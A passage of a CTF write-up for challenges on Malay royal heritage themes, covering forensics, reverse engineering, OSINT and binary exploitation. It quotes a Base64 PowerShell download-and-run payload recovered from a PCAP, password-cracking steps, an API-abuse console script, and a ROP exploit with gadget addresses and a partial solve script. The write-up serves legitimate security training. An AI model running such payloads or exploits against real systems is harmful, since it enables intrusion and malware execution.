+<p>Tersingkap riak di lautan bayang yang sarat berkocak, tatkala hamba menitipkan telinga menelusuri bisikan si Hulubalang; di celah serakan debu yang berterbangan, tersembunyi cebisan warkah yang dicantas dan peti berazimat yang menanti demi menzahirkan panji keramat yang sekian lama berhijab.</p>
+</div>
+<p>Follow the suspicious TCP stream:</p>
+<p>192.168.1.50:53214 → 203.0.113.77:8080</p>
+<p>The stream contains a PNG with a ZIP appended after the PNG IEND.</p>
+<p>Extracting the ZIP gives 10 QR codes. Decode them, verify the hashes, and concatenate the chunks to get an XZ file.</p>
+<p>Decompressing the XZ gives an encrypted ZFS send stream:</p>
+<p>daulat_tuanku/bendera@hulu</p>
+<p>From the ZFS metadata, the encryption parameters are:</p>
+<p>Encryption: AES-256-GCM</p>
+<p>Key format: passphrase</p>
+<p>PBKDF2: HMAC-SHA1</p>
+<p>Iterations:  350000</p>
+<p>Salt: ec9e50df7d4de2ed</p>
+<p>Bruteforce the passphrase using rockyou.txt:</p>
+<pre><code>python3 crack_zfs_rockyou.py \</code></pre>
+<p>-w /usr/share/wordlists/rockyou.txt</p>
+<p>Password found:</p>
+<p>terengganu</p>
+<p>Using the correct password decrypts the ZFS data and reveals:</p>
+<pre><code>3108{efbbc27845fe7d6040c6aa0b9639086d}</code></pre>
+<h3 id="risalah-istana-anak-bukit">Risalah Istana Anak Bukit</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Risalah istana anak bukit telah di kawasan sekitar istana. Namun risalah tersebut bukan sebarang risalah. Sudah ramai yang cuba untuk tafsirkan risalah tersebut namun gagal dan ade sebahgiannya tidak mampu buka risalah tersebut. Adakah anda calon yang mampu membuka risalah tersebut.</p>
+</div>
+<pre><code>The challenge starts with the provided surat.log. While reviewing the log, a suspicious entry can be found inside the relay= field containing a Google Docs link instead of the normal localhost value.</code></pre>
+<p>Following the link reveals a file named:</p>
+<p>Risalah Istana Anak Bukit.docx</p>
+<p>The DOCX is encrypted with Microsoft Office 2007 AES encryption. After extracting the Office hash, the password was cracked using the provided wordlist:</p>
+<p>wordlist_5k.txt</p>
+<p>The correct password is:</p>
+<pre><code>a6_123</code></pre>
+<p>After decrypting and opening the document, the content contains text encoded using a Alien Language ⏃⌰⟟⟒⋏ on dcode.</p>
+<p>Decoding the text gives:</p>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-15.png" alt="Bahtera Siber 3108 CTF evidence 15"></figure>
+<pre><code>flag{almarhum_sultan_abdul_halim_mu&#x27;adzam_shah}</code></pre>
+<h3 id="layar-yang-menanti">Layar Yang Menanti</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>19 Ogos 2026, 11:51 malam.</p>
+<p>Sekeping imej arkib bertaraf SULIT dibuka pada skrin yang tidak sepatutnya - potret sembilan Raja Melayu, dirakam di halaman King&#x27;s House sejurus selepas Perjanjian Persekutuan Tanah Melayu ditandatangani pada 5 Ogos 1957. 26 hari sebelum sebuah negara tercipta.</p>
+<p>Menjelang subuh, semuanya sudah bersih. Fail dipadam. Recycle Bin dilupuskan. Log peristiwa dikosongkan. Stesen semakan WARISAN-WS12 tidak lagi menyimpan apa-apa.</p>
+<p>Tetapi imej itu tidak pernah dibuka di WS12.</p>
+<p>Ia dibuka dari jauh melalui sesi Remote Desktop - dan diubah suai di situ. Mesin yang melukis gambar itu pada skrin bukan mesin yang menyimpannya. Kami sempat memungut data daripada WARISAN-WS07, sebelum ia diimej semula.</p>
+<p>Susun semula apa yang masih menanti di dalam layar itu.</p>
+</div>
+<p>The challenge indicates that the confidential image was viewed and modified through a Remote Desktop session, so the useful evidence would remain on WARISAN-WS07, not WARISAN-WS12.</p>
+<p>Inspecting the RDP artifacts showed that bitmap caching was enabled. The relevant files were located at:</p>
+<pre><code>C:\Users\zulkifli.hamid\AppData\Local\Microsoft\Terminal Server Client\Cache\</code></pre>
+<p>The main cache files were:</p>
+<pre><code>Cache0000.bin
+Cache0001.bin</code></pre>
+<p>RDP bitmap cache files store small pieces of the remote screen, even after the original file and logs are deleted.</p>
+<p>Image_reconstruct.py</p>
+<pre><code>#!/usr/bin/env python3
+from pathlib import Path
+from struct import unpack
+from zipfile import ZipFile
+from PIL import Image
+import sys
+# Recovered tile order from the RDP bitmap cache
+FLAG_TILES = [
+158, 54, 44, 148, 225, 45, 91, 19, 206, 38,
+53, 156, 196, 139, 46, 43, 83, 14, 169, 221
+]
+def read_cache(zip_path):
+with ZipFile(zip_path) as z:
+matches = [
+n for n in z.namelist()
+if &quot;zulkifli.hamid&quot; in n
+and n.endswith(&quot;Cache0001.bin&quot;)
+]
+if not matches:
+raise SystemExit(&quot;[-] Cache0001.bin not found&quot;)
+name = matches[0]
+print(f&quot;[+] Using: {name}&quot;)
+return z.read(name)
+def parse_cache(data):
+if data[:8] != b&quot;RDP8bmp\x00&quot;:
+raise SystemExit(&quot;[-] Invalid RDP bitmap cache&quot;)
+# Skip RDP8bmp header
+offset = 12
+tiles = []
+while offset + 12 &lt;= len(data):
+key1, key2, width, height = unpack(
+&quot;&lt;LLHH&quot;, data[offset:offset + 12]
+)
+offset += 12
+size = width * height * 4
+if width == 0 or height == 0 or offset + size &gt; len(data):
+break
+raw = data[offset:offset + size]
+offset += size
+# Bitmap data is stored as BGRX
+image = Image.frombytes(
+&quot;RGB&quot;,
+(width, height),
+raw,
+&quot;raw&quot;,
+&quot;BGRX&quot;
+)
+tiles.append(image)
+print(f&quot;[+] Parsed {len(tiles)} tiles&quot;)
+return tiles
+def reconstruct(tiles):
+selected = [tiles[i] for i in FLAG_TILES]
+width = sum(img.width for img in selected)
+height = max(img.height for img in selected)
+output = Image.new(&quot;RGB&quot;, (width, height))
+x = 0
+for img in selected:
+output.paste(img, (x, 0))
+x += img.width
+# Enlarge for easier viewing
+output = output.resize(
+(output.width * 2, output.height * 2),
+Image.Resampling.NEAREST
+)
+output.save(&quot;reconstructed_flag.png&quot;)
+print(&quot;[+] Saved: reconstructed_flag.png&quot;)
+print(&quot;[+] FLAG: 3108{Payung_Mahkota_Raja_Melayu}&quot;)
+def main():
+if len(sys.argv) != 2:
+print(f&quot;Usage: {sys.argv[0]} challenge.zip&quot;)
+sys.exit(1)
+data = read_cache(Path(sys.argv[1]))
+tiles = parse_cache(data)
+reconstruct(tiles)
+if __name__ == &quot;__main__&quot;:
+main()</code></pre>
+<p>The cached 64×64 bitmap tiles from Cache0001.bin were extracted and reconstructed. The recovered image contained the hidden text:</p>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-16.png" alt="Bahtera Siber 3108 CTF evidence 16"></figure>
+<p class="flag-line"><strong>Flag: 3108{Payung_Mahkota_Raja_Melayu}</strong></p>
+<h3 id="lagenda-sultan-kedah-tua">Lagenda Sultan Kedah Tua</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Bermulanya kisah kewujudan Kedah diperintah oleh seorang Raja Mahawangsa yang tertulis dek sejarah. Perjuangan yang penuh tumpahan darah dan pertempuran yang tak terbanyang dasyatnya. Kini kisah ini berulang Kembali di sebuah suasana Active Directory yang diserang. Gunakan kemampuan forensic anda untuk meneliti dan mencari apakah yang berlaku di dalam rangkaian yang dipecah masuk ini. Gunakan akal fikiran dan ketajaman minda. Semoga tuan hamba mampu menyelusuri kisah Sultan Kedah pertama yang ditulis lagenda.</p>
+</div>
+<p>From the PCAP, the main hosts were:</p>
+<p>192.168.99.99  -&gt; Attacker</p>
+<p>192.168.99.10  -&gt; Domain Controller</p>
+<p>Domain: kedah.tua</p>
+<p>LDAP traffic revealed a successful login using:</p>
+<p>s.sulaimanshah@kedah.tua</p>
+<p>P@ssw0rd</p>
+<pre><code>After that, the attacker performed AD enumeration, Kerberos/WinRM activity, and accessed an SMB share containing:
+\\192.168.99.99\share</code></pre>
+<p>mimikatz.exe</p>
+<p>The important pivot was an HTTP request:</p>
+<p>GET /update.ps1</p>
+<p>Host: 100.65.0.212</p>
+<p>Following the TCP stream revealed a Base64 PowerShell payload. Decode it with:</p>
+<pre><code>echo &#x27;aXdyIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9mNHJzaGFkMHcvY2hlY2t1cC1zY3JpcHQvcmVmcy9oZWFkcy9tYWluL3NjcmlwdC5iYXQgLU91dEZpbGUgJGVudjpURU1QXFdpbmRvd3NVcGRhdGUuYmF0OyBTdGFydC1Qcm9jZXNzIGNtZCAtQXJncyAiL2MgJGVudjpURU1QXFdpbmRvd3NVcGRhdGUuYmF0Ig==&#x27; | base64 -d</code></pre>
+<p>It downloads:</p>
+<pre><code>https://raw.githubusercontent.com/f4rshad0w/checkup-</code></pre>
+<p>script/refs/heads/main/script.bat</p>
+<p>Inside script.bat was:</p>
+<p>}asgn4wah4m_gn0r3m_tayak1h{8013</p>
+<p>The string is reversed, so:</p>
+<pre><code>echo &#x27;}asgn4wah4m_gn0r3m_tayak1h{8013&#x27; | rev</code></pre>
+<p class="flag-line"><strong>flag: 3108{h1kayat_m3r0ng_m4haw4ngsa}</strong></p>
+<h3 id="cap-mohor-yang-hilang">Cap Mohor Yang Hilang</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Sebuah cakera arkib daripada projek pendigitalan warisan Kesultanan Melaka telah rosak semasa proses pengimejan. Cakera itu mengandungi imej Cap Mohor Diraja berserta nombor pengesahannya.</p>
+<p>Malangnya: imej mohor tidak dapat dibuka oleh mana-mana penyunting imej; rakaman lisan juru arkib telah dipadam daripada senarai direktori; sebahagian daftar disimpan dalam bekas berkunci. Tugas anda: pulihkan ketiga-tiga bahagian nombor pengesahan tersebut.</p>
+<p>Arahan Nombor pengesahan terbahagi kepada tiga: Bahagian A = tertera pada imej mohor itu sendiri (1 perkataan Rumi (HURUF BESAR) + 3 digit) Bahagian B = daripada rakaman yang telah dipadam (1 perkataan Rumi (HURUF BESAR) + 2 digit) Bahagian C = disimpan bersama imej mohor dan terkunci kata kunci = jawapan Bahagian A (1 perkataan + 4 digit)</p>
+<p>Format bendera: 3108{A_B_C} Contoh format (bukan jawapan): 3108{PERKATAAN123_PERKATAAN45_PERKATAAN6789}</p>
+</div>
+<p>repaired MOHOR.PNG by restoring the PNG signature and correcting the corrupted image height. Once the image opened properly, the royal seal showed the word and number:</p>
+<pre><code>LAKSAMANA749</code></pre>
+<p>Next, I checked the FAT16 directory entries and found a deleted WAV file. The audio data was still present on disk and could be recovered because the clusters were contiguous. Viewing the recovered WAV as a spectrogram revealed:</p>
+<pre><code>AYERLELEH23</code></pre>
+<p>Finally, I inspected the repaired PNG and found extra data after the PNG IEND chunk. The appended data was a password-protected ZIP archive containing bahagian_c.txt.</p>
+<p>Using the previously recovered value as the ZIP password:</p>
+<p>unzip -P LAKSAMANA749 bahagian_c.zip</p>
+<p>The extracted file contained:</p>
+<pre><code>MOHOR1699</code></pre>
+<p>Combining all recovered values gives the flag:</p>
+<p class="flag-line"><strong>Flag: 3108{LAKSAMANA749_AYERLELEH23_MOHOR1699}</strong></p>
+<h2 id="mobile-exploitation">Mobile Exploitation</h2>
+<h3 id="bahtera-pomodoro">Bahtera Pomodoro</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Deep within the digital vaults of the modern Malay Heritage Directorate, an ancient royal manuscript has been digitized into a sleek, experimental mobile application. Designed for modern scholars and strategists, the app features a built-in focus timer to help researchers maintain deep concentration while navigating centuries of classical texts, maritime trade routes, and royal decrees. Rumor has it that the app reveals a hidden digital key required to unlock the ultimate royal manuscript (the flag).</p>
+</div>
+<p>Decompile the APK using JADX and search for suspicious classes and strings.</p>
+<p>jadx-gui bahtera.apk</p>
+<p>Inside classes4.dex, a class named SecretReceiver and a hidden broadcast action were found:</p>
+<pre><code>com.example.bahtera.UNLOCK_SECRET</code></pre>
+<p>The same DEX file also contained two Base64-encoded strings:</p>
+<p>MzEwOHt5MHVfZjB1</p>
+<p>bmRfbTNfZ3I0dHp6fQ==</p>
+<p>Decode them:</p>
+<pre><code>echo &#x27;MzEwOHt5MHVfZjB1&#x27; | base64 -d
+echo &#x27;bmRfbTNfZ3I0dHp6fQ==&#x27; | base64 -d</code></pre>
+<h4>Output</h4>
+<p>3108{y0u_f0u</p>
+<p>nd_m3_gr4tzz}</p>
+<p>Combine both parts to get the flag.</p>
+<p class="flag-line"><strong>Flag: 3108{y0u_f0und_m3_gr4tzz}</strong></p>
+<h2 id="osint">OSINT</h2>
+<h3 id="taman-hati">Taman Hati</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Seorang pelancong meninggalkan satu kenangan, sebuah gambar diambil di sebuah taman yang tenang, dikelilingi pokok-pokok rendang dan laluan berbumbung bunga.</p>
+<p>Kenal pasti nama tempat dalam gambar tersebut dan koordinat tepat di mana kamera berada semasa gambar diambil.</p>
+<p>- Koordinat dalam 4 tempat perpuluhan, tanpa bundar digit terakhir</p>
+<p>- Koordinat adalah lokasi kamera, bukan lokasi am tempat tersebut</p>
+<p>FORMAT FLAG</p>
+<p>3108{Nama_Tempat_lat,lon}</p>
+<p>Contoh:</p>
+<p>3108{Nama_Tempat_1.2345,103.4567}</p>
+</div>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-17.png" alt="Bahtera Siber 3108 CTF evidence 17"></figure>
+<p>Found this image at istana Maziah but after going around this is at Padang Maziah</p>
+<p>Asked the CC why the coordinates of this pic is incorrect and he told me to be where the guy is standing to take the picture from so I guess guess and tried below and correct</p>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-18.png" alt="Bahtera Siber 3108 CTF evidence 18"></figure>
+<p class="flag-line"><strong>Flag: 3108{Padang_Maziah_5.3367,103.1384}</strong></p>
+<h3 id="sebuah-istana">Sebuah Istana</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Istana ini telah dibina pada sekitar pemerintahan beliau. Istana tersebut terletak di bandar diraja Klang,Selangor. Istana tersebut menjadi tempat penting untuk urusan rasmi, istiadat diraja, sambutan hari keputeraan, dan adat istiadat pertabalan. Siapakah adinda beliau yang terakhir?</p>
+</div>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-19.png" alt="Bahtera Siber 3108 CTF evidence 19"></figure>
+<pre><code>3108{Raja_Chik}</code></pre>
+<h3 id="kudrat-raja-berdaulat">Kudrat Raja Berdaulat</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Raja berdaulat memayungi sekelian rakyat, menebas ancaman durjana demi keamanan watan. Siapakah sang durjana.</p>
+<p>*Flag format: 3108{md5hash}*</p>
+</div>
+<p>shows the Mandakini River, which is a clue to Churiga (Si) Mandakini, the origin of the name Cura Si Manja Kini, a royal Malay sword.</p>
+<p>In Malay legend, Sang Sapurba used the sword to kill the dragon Saktimuna, which was threatening the people of Minangkabau.</p>
+<p>So, the “sang durjana” = Saktimuna.</p>
+<p>MD5:</p>
+<pre><code>echo -n &quot;Saktimuna&quot; | md5sum</code></pre>
+<p>Result:</p>
+<p>dd79694c1f762ec389a2f5f5450d955c</p>
+<p class="flag-line"><strong>flag: 3108{dd79694c1f762ec389a2f5f5450d955c}</strong></p>
+<h2 id="miscellaneous">Miscellaneous</h2>
+<h3 id="cap-mohor-sembilan-mata">Cap Mohor Sembilan Mata</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Dalam simpanan Bendahara ditemui dua kepingan tembaga. Yang pertama sekeping petak takhta — tiga puluh enam huruf terpahat, tersusun rapi namun tiada bermakna. Yang kedua sekeping cap mohor berlubang sembilan mata, dipahat khas untuk ditindih tepat di atas petak itu. Pada tepi mohor terukir catatan: “Mohor ini dipahat pada tahun raja Melaka yang mula-mula memakai gelaran Sultan menaiki takhta. Ambil digit ketiga tahun tersebut — itulah bilangan pusingan ikut arah jam yang perlu dikenakan pada mohor sebelum bacaan pertama dimulakan. Setelah setiap bacaan, putar sekali lagi ikut arah jam.” Baca setiap tindihan dari kiri ke kanan, atas ke bawah. Cantumkan keempat-empat bacaan mengikut turutan. Tembaga tidak berbohong. Yang berbohong ialah cerita yang terlalu banyak diulang. Format bendera: 3108{TEKS_HURUF_BESAR}</p>
+</div>
+<p>This challenge uses a turning grille cipher on a 6×6 letter grid.</p>
+<p>The clue says the seal was made in the year when the first Melaka ruler to use the title Sultan ascended the throne. This refers to Sultan Muhammad Shah, who ascended in 1424.</p>
+<p>Take the third digit:</p>
+<p>1424 = 2</p>
+<p>So, rotate the 9-hole grille 2 times clockwise before the first reading. After each reading, rotate it once more clockwise.</p>
+<p>Read the exposed letters from left to right, top to bottom.</p>
+<p>The four readings are:</p>
+<p>MOHORDIRA</p>
+<p>JAMELAKAB</p>
+<p>ERMATASEM</p>
+<p>BILANEMAS</p>
+<p>Combine them:</p>
+<p>MOHORDIRAJAMELAKABERMATASEMBILANEMAS</p>
+<p>Split into words:</p>
+<p>MOHOR DIRAJA MELAKA BERMATA SEMBILAN EMAS</p>
+<pre><code>Flag:3108{MOHOR_DIRAJA_MELAKA_BERMATA_SEMBILAN_EMAS}</code></pre>
+<h3 id="persemadian-seorang-raja">Persemadian Seorang Raja</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Pada 24 Ogos 1511, Kota Melaka jatuh ke tangan Portugis di bawah pimpinan Afonso de Albuquerque. Yang tumbang bukan sekadar sebuah kota. Albuquerque mengarahkan perobohan bangunan tempatan — termasuk masjid — untuk mendapatkan bahan binaan bagi mendirikan kubu Portugis di atas bukit yang sama. Warisan fizikal Kesultanan Melayu Melaka dihapuskan hampir sepenuhnya. Makam-makam diraja Melaka lenyap tanpa kesan. Namun satu makam terselamat. Setakat hari ini, hanya satu makam Sultan Melaka yang masih wujud di Malaysia. Dan ia tidak berada di negeri Melaka. Baginda memerintah sebelas tahun sahaja, dan mangkat sekitar usia 30 tahun — dalam keadaan yang masih dipertikaikan. Ayahandanya ialah sultan yang memerintah ketika empayar Melaka berada di kemuncak wilayahnya. Anakandanya pula ialah sultan yang kehilangan segala-galanya pada 1511. Baginda tidak disemadikan di pusat pemerintahan. Baginda disemadikan di atas tapak istananya sendiri di puncak bukit, di sebuah kampung yang namanya sendiri sudah mengaku kehadiran raja. Batu nisan baginda dibawa masuk dari Aceh. Di sebelah makam itu berdiri sebuah masjid jamek yang dinamakan sempena baginda. Tugasan anda: jejaki makam itu. Format bendera 3108{NAMASULTAN_MUKIM_DAERAH_NEGERI} Nama sultan tanpa gelaran, tanpa jarak, huruf besar.</p>
+</div>
+<p>After some a little bit of research.</p>
+<p class="flag-line"><strong>Flag: 3108{ALAUDDINRIAYATSYAH_JORAK_MUAR_JOHOR}</strong></p>
+<h3 id="titah-laju-1">Titah Laju 1</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Titah telah disampaikan, namun hanya mereka yang pantas mampu mengingatinya.</p>
+<p>Uji kepantasan menaip dan pengetahuan kamu tentang sejarah Raja-Raja Melayu. Semakin pantas kamu menaip, semakin dekat kamu dengan flag.</p>
+</div>
+<pre><code>By inspecting /static/app.js, the important API flow is:
+GET  /api/state
+POST /api/start
+POST /api/submit
+The weakness is that /api/state returns the exact sentence before the timer starts.</code></pre>
+<p>So instead of typing manually:</p>
+<p>Get the sentence from /api/state</p>
+<p>Start the timer with /api/start</p>
+<pre><code>Immediately submit the same sentence to /api/submit</code></pre>
+<p>Repeat until all 26 levels are completed</p>
+<p>I used this script in the browser console:</p>
+<pre><code>(async () =&gt; {
+while (true) {
+const state = await fetch(&quot;/api/state&quot;).then(r =&gt; r.json());
+if (state.done) {
+console.log(&quot;FLAG:&quot;, state.flag);
+break;
+}
+await fetch(&quot;/api/start&quot;, {
+method: &quot;POST&quot;,
+headers: { &quot;Content-Type&quot;: &quot;application/json&quot; }
+});
+const res = await fetch(&quot;/api/submit&quot;, {
+method: &quot;POST&quot;,
+headers: { &quot;Content-Type&quot;: &quot;application/json&quot; },
+body: JSON.stringify({ text: state.sentence })
+}).then(r =&gt; r.json());
+console.log(`[+] Level ${state.level}/${state.total}`, res);
+if (res.done) {
+console.log(&quot;FLAG:&quot;, res.flag);
+break;
+}
+await new Promise(r =&gt; setTimeout(r, 100));
+}
+})();</code></pre>
+<p>Because submission happens almost instantly, the server calculates extremely high WPM, easily passing the maximum required 130 WPM.</p>
+<p>After completing level 26, the server returned:</p>
+<p class="flag-line"><strong>Flag: 3108{ed3a3ed658d3ad5e3bb8798b1a7dfdf3}</strong></p>
+<h2 id="reverse-engineering">Reverse Engineering</h2>
+<h3 id="istana-guard">Istana Guard</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Sistem akses istana Istana Besar Seri Menanti menggunakan perisian sistem yang menyembunyikan kata laluan berdasarkan sistem memory.</p>
+</div>
+<p>The executable was identified as a 64-bit .NET assembly. Since .NET stores its strings in UTF-16LE, I extracted them using:</p>
+<pre><code>python3 - &lt;&lt;&#x27;PY&#x27;
+import re</code></pre>
+<p>data = open(&quot;IstanaGuard.exe&quot;, &quot;rb&quot;).read()</p>
+<pre><code>for raw in re.findall(rb&quot;(?:[\x20-\x7e]\x00){4,}&quot;, data):</code></pre>
+<p>print(raw.decode(&quot;utf-16le&quot;))</p>
+<p>PY</p>
+<p>This revealed the flag in separate fragments:</p>
+<p>3108{</p>
+<p>n3g3r1_</p>
+<p>s3mb1l4n_</p>
+<p>d4rul_</p>
+<p>khusus_</p>
+<p>d3bugg3r_</p>
+<p>c4nt_</p>
+<p>h1d3_m3</p>
+<p>The program contains an IsDebuggerPresent anti-debugging check, but the flag fragments remain visible in the assembly. Joining them gives:</p>
+<pre><code>3108{n3g3r1_s3mb1l4n_d4rul_khusus_d3bugg3r_c4nt_h1d3_m3}</code></pre>
+<h3 id="house-of">House of</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Semuanya bermula dengan langkah PERTAMA.</p>
+</div>
+<p>The clue “langkah PERTAMA” suggests starting with the most basic reverse-engineering step: examining the executable’s strings.</p>
+<pre><code>strings -a house-of.exe | grep -E &quot;password|secret|Granted|Wrong|3108&quot;</code></pre>
+<p>The output revealed the hardcoded password and flag:</p>
+<p>whatsthepassword:</p>
+<p>secret123</p>
+<p>Access Granted!</p>
+<p>Wrong Password!</p>
+<pre><code>3108{HOUSE_OF_JAMALULLAIL}</code></pre>
+<p>The program compares the input with secret123, while the flag is stored directly in its .rdata section.</p>
+<pre><code>3108{HOUSE_OF_JAMALULLAIL}</code></pre>
+<h3 id="kuning-berdaulat">Kuning Berdaulat</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Sebagai Ketua Negara, Seri Paduka Baginda Yang di-Pertuan Agong adalah simbol kepada ketaatan warga Malaysia kepada Undang-undang dan Perlembagaan. Panji-panji Diraja adalah simbol kepada kewujudan Institusi Yang di-Pertuan Agong.</p>
+<p>Di hadapan anda, sebuah program kecil yang menyatakan maksud di sebalik Panji Rasmi KDYMM Seri Paduka Baginda Yang di-Pertuan Agong. Program ini akan bertanyakan soalan tentang maksud setiap komponen panji dan jata negara. Jawapan yang betul...ada tersimpan di dalamnya.</p>
+</div>
+<p>Basic analysis:</p>
+<pre><code>file &#x27;panji (1)&#x27;
+strings -a &#x27;panji (1)&#x27;
+nm -n &#x27;panji (1)&#x27;</code></pre>
+<p>The binary is not stripped, so useful symbols such as panji_data, susun_warna, papar_makna, and kemas are visible.</p>
+<p>susun_warna generates the AES-128 key by XORing the stored bytes with 0x80.</p>
+<p>Recovered key:</p>
+<p>Dirgahayu Tuanku</p>
+<p>Hex:</p>
+<p>446972676168617975205475616e6b75</p>
+<p>papar_makna decrypts panji_data using AES-128-ECB. The encrypted data is located at offset 0x4080 with size 0x840.</p>
+<p>Decrypt it with:</p>
+<pre><code>dd if=&#x27;panji (1)&#x27; bs=1 skip=$((0x4080)) count=$((0x840)) status=none \
+| openssl enc -d -aes-128-ecb \
+-K 446972676168617975205475616e6b75 -nopad \
+| strings -a</code></pre>
+<p>This reveals the 12 required answers:</p>
+<p>raja-raja melayu yang berdaulat</p>
+<p>perpaduan sesama kita</p>
+<p>kerajaan persekutuan</p>
+<p>negeri-negeri melayu tidak bersekutu</p>
+<p>pahang darul makmur</p>
+<p>negeri sembilan: beradat, muafakat, berkat</p>
+<p>harimau malaya</p>
+<p>negeri-negeri selat</p>
+<p>pada tahun 1960</p>
+<p>tahun 1963</p>
+<p>kanan</p>
+<p>tahun 1952</p>
+<p>Enter them in order when running the binary. After all 12 answers are accepted, it reads flag.txt.</p>
+<p class="flag-line"><strong>Flag: 3108{D4ul4t_Tu4nku_Dirg4h4yu_N3g4r4kU!}</strong></p>
+<h3 id="adat-istiadat-raja">Adat Istiadat Raja</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Gulungan adat menetapkan tertib istiadat: setiap aturan ada bentuknya, dan setiap bentuk ada tempatnya. Juru adat tidak menyimpan restu di mana-mana, kerana restu itu terbit hanya daripada istiadat yang dilaksana dengan sempurna. Sesiapa yang mengubah kata juru adat tetap tidak beroleh apa-apa, kerana yang menentukan bukan pengakuannya, melainkan tertib itu sendiri.</p>
+</div>
+<p>adat is a 64-bit ELF executable.</p>
+<p>The program expects 16 numeric values, each within the byte range 0–255.</p>
+<pre><code>The important part of the challenge is the correct order/permutation of these values. The flag is not stored directly as plaintext inside the binary.</code></pre>
+<p>During reverse engineering, the input validation was found to use several reversible operations, including:</p>
+<pre><code>MUL
+XOR
+ROL
+ADD</code></pre>
+<p>Each input byte is transformed and compared against hardcoded expected values.</p>
+<p>Since the operations are reversible, the correct input can be recovered by reversing them:</p>
+<pre><code>ADD -&gt; SUB
+ROL -&gt; ROR
+XOR -&gt; XOR</code></pre>
+<p>MUL -&gt; modular inverse</p>
+<p>Reversing the checks for all 16 positions gives the required sequence:</p>
+<pre><code>9 3 7 1 12 5 15 0 8 2 14 6 11 4 13 10</code></pre>
+<h4>Steps</h4>
+<p>Run the binary:</p>
+<pre><code>chmod +x adat
+./adat</code></pre>
+<p>Enter the recovered 16 values:</p>
+<pre><code>9 3 7 1 12 5 15 0 8 2 14 6 11 4 13 10</code></pre>
+<p>The correct sequence generates the internal seed:</p>
+<pre><code>0xbda4dcc778b9f31f</code></pre>
+<p>The program then uses this seed with a SplitMix64-like PRNG to generate an XOR keystream and decrypt the encrypted flag stored in the binary.</p>
+<p>The program outputs:</p>
+<p class="flag-line"><strong>[*] Restu dikurniakan: 3108{4d4t_1st14d4t_d1junjung_t1ngg1}</strong></p>
+<p class="flag-line"><strong>Flag: 3108{4d4t_1st14d4t_d1junjung_t1ngg1}</strong></p>
+<h2 id="binary-exploitation">Binary Exploitation</h2>
+<h3 id="majlis-raja-raja">Majlis Raja Raja</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Sembilan raja bersidang. Tiada seorang pun menyebut apa yang tertulis di hadapan mereka; yang keluar dari mulut majlis hanyalah &quot;belum&quot; atau &quot;sudah&quot;. Adab sidang itu ketat: setiap titah yang diterima tidak boleh ditarik balik, dan bilangan titah bagi satu sidang ada hadnya. Sesiapa yang tersilap kira akan kehabisan giliran sebelum sempat berkata apa-apa. Apabila majlis bersurai, ketetapan yang termeterai itu terus berkuat kuasa.</p>
+</div>
+<p>The binary keeps priorities for 9 rulers in a stack array.</p>
+<p>The index validation only checks whether the supplied index is negative:</p>
+<p>test ax, ax</p>
+<p>js invalid</p>
+<p>There is no check that the index is below 9.</p>
+<p>Later the index is used directly:</p>
+<p>movsx rbx, bx</p>
+<p>movzx edx, byte ptr [rsp + rbx + 6]</p>
+<p>This gives an out-of-bounds stack read/write.</p>
+<p>The program compares our supplied priority with the current byte and returns:</p>
+<p>Belum sampai giliran      -&gt; guess &lt; byte</p>
+<p>Giliran sudah terlepas    -&gt; guess &gt; byte</p>
+<p>Keutamaan baharu          -&gt; guess == byte</p>
+<p>Because this is a signed byte comparison, we can binary-search every byte from:</p>
+<p>-128 .. 127</p>
+<p>When the correct value is found, the program asks for a new value and performs:</p>
+<p>mov byte ptr [rsp + index + 6], al</p>
+<p>So we get a byte-by-byte arbitrary stack write.</p>
+<h4>Saved RIP</h4>
+<p>The priority array begins at:</p>
+<p>rsp + 0x06</p>
+<p>Saved RIP is at:</p>
+<p>rsp + 0x58</p>
+<p>Therefore:</p>
+<p>0x58 - 0x06 = 0x52 = 82</p>
+<p>So index 82 starts overwriting the saved return address.</p>
+<p>Since the binary is static and non-PIE, ROP gadget addresses are fixed.</p>
+<h4>Exploit</h4>
+<p>Instead of spawning a shell, use an ORW chain:</p>
+<pre><code>read path into BSS
+open(&quot;/home/majlis/ketetapan.txt&quot;)</code></pre>
+<p>read(flag_fd, buffer, 0x100)</p>
+<p>write(1, buffer, 0x100)</p>
+<p>The flag path is already present in the binary:</p>
+<pre><code>/home/majlis/ketetapan.txt</code></pre>
+<p>Useful addresses:</p>
+<pre><code>pop rdi ; ret                 0x401d39
+pop rsi ; pop r15 ; ret       0x401d37
+pop rdx ; pop rbx ; ret       0x401955</code></pre>
+<p>xchg eax, edi ; ret           0x41fd7d</p>
+<pre><code>read                          0x41c670</code></pre>
+<p>open                          0x41c550</p>
+<pre><code>write                         0x41c710
+exit                          0x41c400</code></pre>
+<p>xchg eax, edi ; ret is used after open() so we use the actual returned file descriptor instead of assuming it is 3.</p>
+<p>The challenge allows 2600 commands, while the exploit only needs around 1700. The remaining commands are burned using invalid -1 indices until the function returns into our ROP chain.</p>
+<h4>Solve.py</h4>
+<pre><code>#!/usr/bin/env python3
+import socket
+import select
+import time
+import struct
+import sys
+import re
+HOST = &quot;168.144.106.166&quot;
+PORT = 30002
+TOTAL = 2600
+POP_RDI     = 0x401d39
+POP_RSI_R15 = 0x401d37
+POP_RDX_RBX = 0x401955
+READ  = 0x41c670
